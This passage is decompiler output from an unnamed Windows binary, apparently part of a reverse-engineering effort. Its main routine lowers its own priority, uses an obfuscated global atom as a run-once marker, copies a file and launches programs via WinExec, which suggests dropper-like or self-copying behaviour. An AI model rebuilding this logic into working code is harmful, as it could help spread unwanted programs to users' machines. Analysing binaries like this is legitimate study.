  __int32 v45; // [esp+6Ch] [ebp-1CCh] BYREF
  __int32 v46; // [esp+70h] [ebp-1C8h] BYREF
  __int32 v47; // [esp+74h] [ebp-1C4h] BYREF
  char *v48; // [esp+78h] [ebp-1C0h] BYREF
  __int32 v49; // [esp+7Ch] [ebp-1BCh] BYREF
  __int32 v50; // [esp+80h] [ebp-1B8h] BYREF
  char *v51; // [esp+84h] [ebp-1B4h] BYREF
  __int32 v52; // [esp+88h] [ebp-1B0h] BYREF
  __int32 v53; // [esp+8Ch] [ebp-1ACh] BYREF
  __int32 v54; // [esp+90h] [ebp-1A8h] BYREF
  char *v55; // [esp+94h] [ebp-1A4h] BYREF
  char *v56; // [esp+98h] [ebp-1A0h] BYREF
  __int32 v57; // [esp+9Ch] [ebp-19Ch] BYREF
  __int32 v58; // [esp+A0h] [ebp-198h] BYREF
  char *v59; // [esp+A4h] [ebp-194h] BYREF
  char *v60; // [esp+A8h] [ebp-190h] BYREF
  char *v61; // [esp+ACh] [ebp-18Ch] BYREF
  char *v62; // [esp+B0h] [ebp-188h] BYREF
  char *v63; // [esp+B4h] [ebp-184h] BYREF
  __int32 v64; // [esp+B8h] [ebp-180h] BYREF
  char *v65; // [esp+BCh] [ebp-17Ch] BYREF
  char *v66; // [esp+C0h] [ebp-178h] BYREF
  char *v67; // [esp+C4h] [ebp-174h] BYREF
  char *v68; // [esp+C8h] [ebp-170h] BYREF
  char *v69; // [esp+CCh] [ebp-16Ch] BYREF
  char *v70; // [esp+D0h] [ebp-168h] BYREF
  char *v71; // [esp+D4h] [ebp-164h] BYREF
  char *v72; // [esp+D8h] [ebp-160h] BYREF
  __int32 v73; // [esp+DCh] [ebp-15Ch] BYREF
  char *v74; // [esp+E0h] [ebp-158h] BYREF
  __int32 v75; // [esp+E4h] [ebp-154h] BYREF
  __int32 v76; // [esp+E8h] [ebp-150h] BYREF
  __int32 v77; // [esp+ECh] [ebp-14Ch] BYREF
  char *v78; // [esp+F0h] [ebp-148h] BYREF
  char *v79; // [esp+F4h] [ebp-144h] BYREF
  __int32 v80; // [esp+F8h] [ebp-140h] BYREF
  char *v81; // [esp+FCh] [ebp-13Ch] BYREF
  char *v82; // [esp+100h] [ebp-138h] BYREF
  char *v83; // [esp+104h] [ebp-134h] BYREF
  char *v84; // [esp+108h] [ebp-130h] BYREF
  char *v85; // [esp+10Ch] [ebp-12Ch] BYREF
  __int32 v86; // [esp+110h] [ebp-128h] BYREF
  char *v87; // [esp+114h] [ebp-124h] BYREF
  __int32 v88; // [esp+118h] [ebp-120h] BYREF
  __int32 v89; // [esp+11Ch] [ebp-11Ch] BYREF
  __int32 v90; // [esp+120h] [ebp-118h] BYREF
  char v91[256]; // [esp+124h] [ebp-114h] BYREF
  __int32 v92; // [esp+224h] [ebp-14h] BYREF
  int v93[4]; // [esp+228h] [ebp-10h] BYREF
  int savedregs; // [esp+238h] [ebp+0h] BYREF

  sub_405A80((int)&dword_41A8D4, (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs);
  v27 = &savedregs;
  v26[1] = (unsigned int)&loc_41B4DD;
  v26[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v26);
  v25[2] = (unsigned int)&savedregs;
  v25[1] = (unsigned int)&loc_41B48E;
  v25[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v25);
  CurrentProcess = GetCurrentProcess();
  SetPriorityClass(CurrentProcess, 0x20u);
  CurrentThread = GetCurrentThread();
  SetThreadPriority(CurrentThread, -1);
  sub_41A7EC(v3);
  sub_415FAC((int)dword_41B4F4, 0, v93);
  sub_40351C(&dword_41EEFC, v93[0]);
  sub_415EAC(dword_41EEFC, (char *)dword_41B50C, 0, &v92, 1, 0);
  dword_41EF10 = sub_402978(v92, (char **)&dword_41EF10) + 1;
  sub_40296C(dword_41EF10, v91);
  sub_4036EC((char **)&dword_41EED8, v91);
  sub_415EAC(dword_41EEFC, (char *)dword_41B50C, (char *)dword_41EED8, &v90, 1, 1);
  sub_402768(0, (char **)&dword_41EED8);
  sub_415FAC((int)dword_41B518, 0, &v89);
  sub_40351C(&dword_41EEEC, v89);
  sub_415FAC((int)dword_41B564, 0, (volatile __int32 *)&v87);
  sub_415EAC(dword_41EEEC, v87, 0, &v88, 0, 0);
  sub_40351C(&dword_41EEE0, v88);
  sub_415FAC((int)dword_41B578, 0, (volatile __int32 *)&v85);
  sub_415EAC(dword_41EEEC, v85, 0, &v86, 0, 0);
  sub_40351C(&dword_41EEE4, v86);
  sub_41609C(1, &v84);
  sub_40351C(&dword_41EEF8, (__int32)v84);
  sub_41609C(2, &v83);
  sub_40351C(&dword_41EEE8, (__int32)v83);
  sub_415FAC((int)dword_41B588, 0, (volatile __int32 *)&v82);
  v21 = v82;
  sub_403670(&v81);
  sub_403770(&dword_41EEF0, v81, v21);
  sub_4073EC((char *)dword_41EED8, &v78);
  sub_406D90(v78, &v79);
  sub_407324(v79, 0, &v80);
  sub_40351C(&dword_41EF08, v80);
  sub_415EAC(dword_41EEFC, (char *)dword_41B59C, (char *)dword_41EF08, &v77, 1, 1);
  sub_415EAC(dword_41EEFC, (char *)dword_41B5B8, "1.88", &v76, 1, 1);
  sub_415FAC(dword_41EF08, 1, &v75);
  sub_40351C(&dword_41EF00, v75);
  byte_41EF20 = 0;
  v4 = 0;
  byte_41EF21 = 0;
  sub_403834(dword_41EF00, dword_41B5C4);
  if ( v5 || (sub_403834(dword_41EF00, dword_41B5D4), v5) || (sub_403834(dword_41EF00, dword_41B5E4), v5) )
  {
    sub_402768(1, &v72);
    sub_402768(2, &v71);
    sub_402768(3, &v70);
    sub_402768(4, &v69);
    sub_402768(5, &v68);
    sub_402768(6, &v67);
    sub_402768(7, &v66);
    sub_402768(8, &v65);
    sub_4037E4(&v73, 15);
    sub_406E9C(v73, &v74);
    sub_40351C(&dword_41EF04, (__int32)v74);
    sub_415FAC((int)dword_41B610, 0, &v64);
    sub_4037E4(&dword_41EEF4, 3);
    sub_403834(dword_41EF00, dword_41B5E4);
    if ( v5 )
    {
      sub_4037E4((volatile __int32 *)&v63, 3);
      v6 = sub_4038E8(v63);
      WinExec(v6, 1u);
    }
    sub_403834(dword_41EF00, dword_41B5C4);
    if ( v5 )
    {
      sub_4037E4(&dword_41EF00, 3);
      sub_406D90((_BYTE *)dword_41EEE4, &v62);
      sub_40372C(&v62, (__int32)dword_41B604);
      v22 = v62;
      sub_402768(1, &v59);
      sub_4073B8(v59, &v60);
      sub_406D90(v60, &v61);
      sub_403834((int)v22, (int *)v61);
      if ( v5 )
      {
        v23 = dword_41EF00;
        sub_41A77C(90, &v58);
        v16 = v58;
        sub_41A77C(90, &v57);
        v13 = v57;
        sub_402768(1, &v56);
        if ( (unsigned __int8)sub_4171C0((char *)dword_41EED8, v56, 0, 1, v13, v16, v23) )
        {
          sub_402768(1, &v55);
          v17 = sub_4038E8(v55);
          v7 = sub_4038E8((char *)dword_41EF00);
          CopyFileA(v7, v17, 0);
        }
      }
      v8 = sub_4038E8((char *)dword_41EF04);
      WinExec(v8, 1u);
    }
  }
  else
  {
    sub_416A1C((char *)dword_41EED8, dword_41B624, 2, &v54);
    sub_403834(v54, dword_41B630);
    if ( v5 )
    {
      sub_416A1C((char *)dword_41EED8, &dword_41B63C, 8, &v53);
      dword_41EF0C = sub_402978(v53, (char **)&dword_41EF0C);
      sub_416C54((char *)dword_41EED8, dword_41EF0C);
      if ( !GlobalFindAtomA("`s}Onw") )
      {
        sub_415FAC((int)dword_41B650, 0, &v52);
        sub_40351C(&dword_41EEF4, v52);
        sub_403770((volatile __int32 *)&v51, (char *)dword_41EEF0, (char *)dword_41EEF4);
        if ( !sub_4071A8(v51) )
        {
          v24 = (char *)dword_41EEF4;
          sub_41A77C(90, &v50);
          v14 = v50;
          sub_41A77C(90, &v49);
          sub_416478(
            (char *)dword_41EED8,
            0,
            (char *)dword_41EEF0,
            0,
            0,
            dword_41EF0C,
            v49,
            v14,
            (int)dword_41B664,
            v24);
          sub_403770((volatile __int32 *)&v48, (char *)dword_41EEF0, (char *)dword_41EEF4);
          sub_4071B8(v48, 2u);
        }
        sub_403770(&dword_41EED8, (char *)dword_41EEF0, (char *)dword_41EEF4);
      }
      byte_41EF21 = 1;
    }
    else
    {
      byte_41EF20 = 1;
    }
  }
  sub_418880((char *)dword_41EED8);
  if ( dword_41EF10 > 8000 )
    LOBYTE(v4) = 1;
  if ( ((unsigned __int8)v4 | (GlobalFindAtomA("`s}Onw") == 0) || byte_41EF20) && !byte_41EF21 )
  {
    GlobalAddAtomA("`s}Onw");
    sub_415EAC(dword_41EEFC, (char *)dword_41B67C, (char *)dword_41B670, &v47, 1, 1);
    sub_415EAC(dword_41EEFC, (char *)&dword_41B694, (char *)dword_41B688, &v46, 1, 1);
    sub_415EAC(dword_41EEFC, (char *)dword_41B50C, 0, &v45, 1, 0);
    dword_41EF10 = sub_402978(v45, (char **)&dword_41EF10);
    *(double *)&v9 = sub_408090();
    sub_408C78(&v44, v9, HIDWORD(v9));
    sub_40351C(&dword_41EEF4, (__int32)v44);
    v43[1] = *(_BYTE *)dword_41EEF4;
    v43[0] = 1;
    sub_402848(v42, v43);
    v41 = *(_BYTE *)(dword_41EEF4 + 1);
    v40 = 1;
    sub_402818((unsigned __int8 *)v42, &v40, 2u);
    sub_402864((int)v42, (int)&dword_41B698, (unsigned __int8)v42[0] + 1);
    if ( v5 )
    {
      v41 = *(_BYTE *)(dword_41EEF4 + 3);
      v40 = 1;
      sub_402848(v39, &v40);
      v38[1] = *(_BYTE *)(dword_41EEF4 + 4);
      v38[0] = 1;
      sub_402818((unsigned __int8 *)v39, (unsigned __int8 *)v38, 2u);
      sub_402864((int)v39, (int)dword_41B69C, (unsigned __int8)v39[0] + 1);
      if ( v5 )
      {
        if ( sub_4028F4(0x14u) == 8 )
          byte_41EF20 = 1;
      }
    }
    if ( byte_41EF20 )
    {
      sub_415EAC(dword_41EEFC, (char *)dword_41B6A8, (char *)dword_41B670, &v37, 1, 1);
      dword_41EF14 = (int)sub_402BAC(&off_40BBB4, 1);
      sub_415FAC((int)dword_41B6B4, 0, (volatile __int32 *)&v36);
      v18 = v36;
      sub_403670(&v35);
      sub_40372C(&v35, (__int32)dword_41B6C0);
      sub_417928(v35, v18, (int)&dword_41EF14, 1);
      sub_402BDC((_DWORD *)dword_41EF14);
      LOBYTE(v4) = 1;
    }
    if ( (_BYTE)v4 )
    {
      sub_415EAC(dword_41EEFC, "FC41", 0, &v34, 1, 0);
      if ( !v34 && sub_4028F4(0x32u) == 8 )
      {
        sub_415EAC(dword_41EEFC, (char *)dword_41B6A8, (char *)dword_41B624, &v33, 1, 1);
        if ( byte_41EF20 )
          dword_41EF10 = 3;
        else
          dword_41EF10 = 1;
        if ( sub_4028F4(2u) == 1 )
          sub_40351C(&dword_41EEF4, (__int32)dword_41B6DC);
        else
          sub_40351C(&dword_41EEF4, (__int32)dword_41B710);
        v19 = dword_41EF10;
        v10 = sub_407500(0);
        v11 = sub_4055D6(v10, 3u, 0);
        LODWORD(v12) = sub_405590(v11, v19, SHIDWORD(v19));
        v20 = v12;
        sub_415FAC(dword_41EEF4, 0, (volatile __int32 *)&v32);
        sub_40372C(&v32, (__int32)dword_41B5F8);
        v15 = v32;
        sub_415FAC((int)dword_41B774, 0, (volatile __int32 *)&v30);
        sub_403770((volatile __int32 *)&v31, (char *)dword_41EEF0, v30);
        sub_418C48(v31, (int)v15, v4, (int)&dword_41EF10, v20);
        sub_415EAC(dword_41EEFC, "FC41", (char *)dword_41B670, &v29, 1, 1);
      }
    }
    sub_41A5E4(v4, a1, (int)&dword_41EF10);
    sub_418DC8("`s}Onw");
    sub_415EAC(dword_41EEFC, (char *)dword_41B67C, (char *)dword_41B688, &v28, 1, 1);
  }
  __writefsdword(0, v25[0]);
  __writefsdword(0, v26[0]);
  v27 = (int *)&loc_41B4E4;
  sub_4034EC((int)&v28, 10);
  sub_4034EC((int)&v44, 47);
  sub_4034EC((int)&v92, 2);
  sub_403390();
}
// 41A9FC: variable 'v3' is possibly undefined
// 41AC71: variable 'v5' is possibly undefined
// 41B3D8: variable 'v12' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 41A8D4: using guessed type int dword_41A8D4;
// 41B4F4: using guessed type int dword_41B4F4[6];
// 41B50C: using guessed type int dword_41B50C[3];
// 41B518: using guessed type int dword_41B518[19];
// 41B564: using guessed type int dword_41B564[3];
// 41B578: using guessed type int dword_41B578[4];
// 41B588: using guessed type int dword_41B588[5];
// 41B59C: using guessed type int dword_41B59C[3];
// 41B5B8: using guessed type int dword_41B5B8[3];
// 41B5C4: using guessed type int dword_41B5C4[4];
// 41B5D4: using guessed type int dword_41B5D4[4];
// 41B5E4: using guessed type int dword_41B5E4[3];
// 41B5F8: using guessed type int dword_41B5F8[3];
// 41B604: using guessed type int dword_41B604[3];
// 41B610: using guessed type int dword_41B610[5];
// 41B624: using guessed type int dword_41B624[3];
// 41B630: using guessed type int dword_41B630[3];
// 41B63C: using guessed type int dword_41B63C;
// 41B650: using guessed type int dword_41B650[5];
// 41B664: using guessed type int dword_41B664[3];
// 41B670: using guessed type int dword_41B670[3];
// 41B67C: using guessed type int dword_41B67C[3];
// 41B688: using guessed type int dword_41B688[3];
// 41B694: using guessed type int dword_41B694;
// 41B698: using guessed type int dword_41B698;
// 41B69C: using guessed type int dword_41B69C[3];
// 41B6A8: using guessed type int dword_41B6A8[3];
// 41B6B4: using guessed type int dword_41B6B4[3];
// 41B6C0: using guessed type int dword_41B6C0[3];
// 41B6DC: using guessed type int dword_41B6DC[13];
// 41B710: using guessed type int dword_41B710[25];
// 41B774: using guessed type int dword_41B774[5];
// 41EED8: using guessed type int dword_41EED8;
// 41EEE0: using guessed type int dword_41EEE0;
// 41EEE4: using guessed type int dword_41EEE4;
// 41EEE8: using guessed type int dword_41EEE8;
// 41EEEC: using guessed type int dword_41EEEC;
// 41EEF0: using guessed type int dword_41EEF0;
// 41EEF4: using guessed type int dword_41EEF4;
// 41EEF8: using guessed type int dword_41EEF8;
// 41EEFC: using guessed type int dword_41EEFC;
// 41EF00: using guessed type int dword_41EF00;
// 41EF04: using guessed type int dword_41EF04;
// 41EF08: using guessed type int dword_41EF08;
// 41EF0C: using guessed type int dword_41EF0C;
// 41EF10: using guessed type int dword_41EF10;
// 41EF14: using guessed type int dword_41EF14;
// 41EF20: using guessed type char byte_41EF20;
// 41EF21: using guessed type char byte_41EF21;
// 41A9A4: using guessed type __int32 var_10[4];
// 41A9A4: using guessed type char var_1D4[4];
// 41A9A4: using guessed type char var_1D8[4];
// 41A9A4: using guessed type char var_1E0[4];
// 41A9A4: using guessed type unsigned __int8 var_1E4[4];

// nfuncs=976 queued=765 decompiled=765 lumina nreq=0 worse=0 better=0
#error "There were 2 decompilation failure(s) on 765 function(s)"
